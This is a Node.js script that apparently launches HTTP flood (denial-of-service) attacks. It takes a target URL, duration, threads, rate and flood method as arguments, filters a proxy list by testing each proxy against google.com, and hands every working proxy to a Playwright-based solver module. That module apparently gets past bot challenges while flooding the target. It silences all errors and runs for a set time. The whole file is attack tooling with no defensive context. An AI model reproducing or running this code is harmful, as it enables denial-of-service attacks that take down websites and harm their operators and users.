process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;

const { solverInstance } = require('./playwright');
const { spawn } = require('child_process');

const fs = require('fs');
const colors = require('colors');
const request = require("request");
const validProxies = [];

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[5]; // Flooder Threads
const rateT = process.argv[6]; // Rate per IP
const methodT = process.argv[7]; // Flood Method

const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');


function log(string) {
	let d = new Date();
	let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
	console.log(`(${hours}:${minutes}:${seconds}) - ${string}`);
}

function check_proxy(proxy) {
	request({
		url: "https://google.com/",
		proxy: "http://" + proxy,
		headers: {
			'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		}
	}, (err, res, body) => {
		if (!err) {
			validProxies.push(proxy);
			log('(' + 'Proxies'.magenta + `)`.white + ` Adding new proxy: ` + `${proxy}`.green + ' to queue list.');
		}
	});
}
async function sessionIn() {
	validProxies.forEach((e) => {
			solverInstance({
				"Target": urlT,
				"Time": timeT,
				"Threads": threadsT,
				"Rate": rateT,
				"Method": methodT,
				"Proxy": e
		}).then((cookie, _) => {
		}).catch((ee) => {
			log(ee);
		})
	})
}

function main() {
	proxies.forEach((e) => {
		check_proxy(e);
	})

	setTimeout(() => {
		return sessionIn();
	}, 15 * 1000);
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000)

// sessionIn();